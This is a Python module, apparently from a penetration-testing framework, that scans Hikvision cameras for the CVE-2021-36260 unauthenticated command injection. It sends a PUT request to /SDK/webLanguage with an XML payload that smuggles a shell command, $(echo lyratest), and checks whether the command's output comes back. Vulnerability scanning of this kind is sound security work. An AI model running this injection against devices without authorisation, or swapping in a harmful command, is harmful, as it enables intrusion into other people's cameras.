import httpx
from core.base import BaseModule

class Module(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "hikvision/cve_2021_36260_scan"
        self.description = "Unauthenticated Remote Command Injection scanner for Hikvision devices (CVE-2021-36260)."
        self.type = "scan"
        self.options = {
            "TARGET": {"required": True, "value": ""},
            "PORT": {"required": False, "value": "80"}
        }

    async def run(self):
        target = self.options["TARGET"]["value"]
        port = self.options["PORT"]["value"]
        
        # En OSINT/Pentest, on gère les cas où l'utilisateur spécifie http/https ou juste une IP
        if not target.startswith(("http://", "https://")):
            url = f"http://{target}:{port}/SDK/webLanguage"
        else:
            url = f"{target.rstrip('/')}/SDK/webLanguage"
            
        headers = {
            "Content-Type": "application/xml",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) dvr-framework/1.0"
        }
        
        # Ce payload XML injecte une commande shell 'echo' via le paramètre de langue
        # Si l'appareil est vulnérable, il va tenter d'exécuter la commande ou échouer proprement sur le XML
        payload = (
            "<?xml version='1.0' encoding='UTF-8'?>"
            "<Language>"
            "<id><![CDATA[$(echo lyratest)]]></id>"
            "</Language>"
        )
        
        try:
            # On ignore les erreurs SSL pour les caméras qui utilisent des certificats auto-signés
            async with httpx.AsyncClient(timeout=6.0, verify=False) as client:
                response = await client.put(url, headers=headers, content=payload)
                
                # Le serveur web de Hikvision renvoie généralement un code 500 avec un statut d'erreur Linux 
                # ou un comportement de crash de page web spécifique si l'injection passe
                if response.status_code in [200, 500] and "lyratest" in response.text:
                    return {
                        "vulnerable": True,
                        "details": f"Device is highly VULNERABLE to CVE-2021-36260 (Command injection succeeded)."
                    }
                
                # Deuxième méthode de vérification : Analyse des en-têtes ou comportement anormal
                elif response.status_code == 500 and "invalid" in response.text.lower():
                    # L'injection a été bloquée par le parseur mais le point d'accès est présent
                    return {
                        "vulnerable": True,
                        "details": "Device web server responded to raw SDK payloads. Potentially vulnerable."
                    }
                    
        except httpx.RequestError as e:
            return {"vulnerable": False, "error": f"Connection failed: {type(e).__name__}"}
        except Exception as e:
            return {"vulnerable": False, "error": str(e)}
            
        return {"vulnerable": False, "details": "Device patched or non-Hikvision endpoint."}
